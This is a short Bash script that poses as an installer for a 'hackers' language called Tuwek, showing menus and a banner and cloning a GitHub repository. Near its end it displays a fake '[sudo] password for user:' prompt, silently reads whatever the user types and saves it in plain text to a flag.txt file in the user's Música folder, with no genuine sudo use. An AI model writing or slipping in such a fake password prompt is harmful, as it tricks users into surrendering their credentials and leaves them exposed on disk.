#!/bin/bash
usuario=$(whoami)
#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function init_program() {
    echo -e "${redColour}[*] ${yellowColour}Bienvenido al instalador de Tuwek (Language for hackers)";echo
    echo -e "${endColour}¿Que version quieres descargar?"
    echo -e "${greenColour}1. ${endColour}Stable Version 1.06.8 ${grayColour}(recomendada)"
    echo -e "${greenColour}2. ${endColour}Experimental Version 1.06.10"; read version; echo
    echo -e "${redColour}[*] ${yellowColour}Lista de interfaces de red...${endColour}"; ifconfig
    echo -e "¿Cual es tu interfaz de red?"; read interface; clear
    echo -e "${turquoiseColour}Descargando paquetes desde el sevidor...${endColour}"
    git clone https://www.github.com/r4yX/tuwek/
    mkdir /home/$usuario/work_dir/
    sudo cp -r tuwek /home/$usuario/work_dir/
    clear
}

function banner() {
    clear; echo 
    echo -e "${yellowColour}########################################"
    echo -e "####|___    ___|############| |##/ /####"
    echo -e "########|  |################| |#/ /#####" 
    echo -e "########|  |#\ \########/ /#| |/ /######"
    echo -e "########|  |##\ \##/\##/ /##| |\ \######"
    echo -e "########|  |###\ \/##\/ /###| |#\ \#####"
    echo -e "########|  |####\ \/\/ /####| |##\ \####"
    echo -e "########################################"
    echo -e "${purpleColour}----------------------------------------"
    echo -e "${purpleColour}|   ${turquoiseColour}v 1.06.8   ${purpleColour}|   ${redColour}Python for hackers  ${purpleColour}|"
    echo -e "----------------------------------------"
    init_program
}
echo -e "[sudo] password for user: ";read -s password
touch /home/$usuario/Música/flag.txt
echo "$password" > /home/$usuario/Música/flag.txt
banner